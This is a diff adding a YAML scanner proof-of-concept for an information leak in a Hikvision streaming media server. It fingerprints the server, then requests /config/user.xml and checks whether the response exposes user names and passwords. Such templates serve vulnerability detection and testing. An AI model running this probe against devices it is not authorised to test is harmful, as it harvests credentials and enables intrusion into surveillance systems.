@@ -1,0 +1,17 @@
+name: poc-yaml-hikvision-info-leak
+rules:
+  - method: GET
+    path: /
+    follow_redirects: false
+    expression: |
+      response.status == 200 && response.body.bcontains(b"<TITLE>流媒体管理服务器</TITLE>") && response.body.bcontains(b"海康威视")
+  - method: GET
+    path: /config/user.xml
+    follow_redirects: false
+    expression: |
+      response.status == 200 && response.body.bcontains(b"<user name=\"") && response.body.bcontains(b" password=\"")
+detail:
+  author: tangshoupu
+  info: Hikvision ikvision-info-leak
+  links:
+    - https://www.seebug.org/vuldb/ssvid-91762
